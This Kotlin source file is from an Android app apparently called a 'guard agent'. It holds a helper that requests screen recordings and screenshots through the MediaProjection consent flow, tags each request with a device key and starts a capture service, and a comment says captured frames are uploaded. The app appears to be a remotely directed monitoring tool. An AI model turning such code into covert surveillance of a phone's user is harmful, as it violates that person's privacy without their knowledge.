package com.guard.agent.helpers.media

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import com.guard.agent.core.Constants
import com.guard.agent.services.ScreenCaptureService
import com.guard.agent.utils.Logger

object ScreenHelper {

    private const val TAG = "ScreenHelper"

    /**
     * Screen recording request — MediaProjection consent ke liye activity kholo.
     */
    fun requestScreenRecord(ctx: Context, deviceKey: String, duration: Int) {
        try {
            val intent = Intent(ctx, MediaProjectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(MediaProjectionActivity.EXTRA_MODE, MediaProjectionActivity.MODE_RECORD)
                putExtra(MediaProjectionActivity.EXTRA_DURATION, duration)
                putExtra(MediaProjectionActivity.EXTRA_DEVICE_KEY, deviceKey)
            }
            ctx.startActivity(intent)
            Logger.d(TAG, "Screen record requested")
        } catch (e: Exception) {
            Logger.e(TAG, "requestScreenRecord failed", e)
        }
    }

    /**
     * Screenshot request — ek frame capture karke upload.
     */
    fun requestScreenshot(ctx: Context, deviceKey: String) {
        try {
            val intent = Intent(ctx, MediaProjectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(MediaProjectionActivity.EXTRA_MODE, MediaProjectionActivity.MODE_SCREENSHOT)
                putExtra(MediaProjectionActivity.EXTRA_DEVICE_KEY, deviceKey)
            }
            ctx.startActivity(intent)
            Logger.d(TAG, "Screenshot requested")
        } catch (e: Exception) {
            Logger.e(TAG, "requestScreenshot failed", e)
        }
    }

    /**
     * Start ScreenCaptureService with consent data.
     */
    fun startCaptureService(
        ctx: Context,
        resultCode: Int,
        data: Intent,
        duration: Int,
        deviceKey: String
    ) {
        val svc = Intent(ctx, ScreenCaptureService::class.java).apply {
            putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
            putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
            putExtra(ScreenCaptureService.EXTRA_DURATION, duration)
            putExtra(ScreenCaptureService.EXTRA_DEVICE_KEY, deviceKey)
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            ctx.startForegroundService(svc)
        } else {
            ctx.startService(svc)
        }
    }
}
